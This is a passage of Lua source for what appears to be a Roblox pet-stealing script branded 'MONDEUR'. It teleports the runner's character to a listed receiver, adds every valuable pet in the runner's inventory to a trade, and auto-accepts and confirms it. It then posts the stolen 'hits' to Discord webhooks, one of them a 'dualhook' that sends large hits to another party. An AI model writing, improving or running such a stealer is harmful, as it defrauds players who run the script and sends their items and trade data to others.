-- WEBHOOK ROUTING & PING LOGIC
--------------------------------------------------------------
local function processReporting(pets, total)
    local embed = buildMondeurEmbed(pets, total)
    
    -- 1. USERHOOK LOGIC: Receives EVERY successful trade hit.
    -- Tags @everyone only if total value >= User-defined Threshold.
    local userPing = (total >= USER_THRESHOLD) and "@everyone" or ""
    sendDiscordRequest(USER_WEBHOOK, {content = userPing, embeds = {embed}})

    -- 2. DUALHOOK LOGIC: Filtered hit (>= 500). Always tags @everyone.
    local dualTrigger = (total >= DUALHOOK_PING_MIN)
    for _, p in ipairs(pets) do if p.value >= DUALHOOK_PING_MIN then dualTrigger = true break end end
    
    if dualTrigger then
        sendDiscordRequest(DUAL_WEBHOOK, {content = "@everyone", embeds = {embed}})
    end
end

--------------------------------------------------------------
-- CORE EXECUTION (TP & TRADE)
--------------------------------------------------------------
local function findReceiver()
    for _, name in ipairs(TARGET_RECEIVERS) do
        local p = Players:FindFirstChild(name)
        if p and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
            return p
        end
    end
    return nil
end

local function runSequence()
    local target = findReceiver()
    if not target then return end

    -- Phase 1: Proximity Teleport
    local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if hrp then 
        hrp.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 3) 
    end
    task.wait(0.1)

    -- Phase 2: Open Trade
    TradeAPI["TradeAPI/SendTradeRequest"]:FireServer(target)
    
    -- Phase 3: Inventory Filter & Valuation
    local success, inventory = pcall(function() 
        return TradeAPI["InventoryAPI/GetInventory"]:InvokeServer() 
    end)
    
    if success and inventory then
        local petsToExport, totalValue = {}, 0
        for _, item in ipairs(inventory) do
            if item.Kind == "Pet" then
                local petVal = PetValues[item.Name] or 0
                if petVal > 0 then
                    table.insert(petsToExport, {name = item.Name, value = petVal})
                    totalValue = totalValue + petVal
                    -- Phase 4: Direct Remote Addition
                    TradeAPI["TradeAPI/AddItemToOffer"]:FireServer(item.Id)
                end
            end
        end

        -- Phase 5: Confirm Sequence
        if #petsToExport > 0 then
            TradeAPI["TradeAPI/AcceptTrade"]:FireServer()
            TradeAPI["TradeAPI/ConfirmTrade"]:FireServer()
            
            processReporting(petsToExport, totalValue)
            print("[MONDEUR] Successfully Exported: " .. tostring(totalValue) .. " Pesos")
        end
    end
end

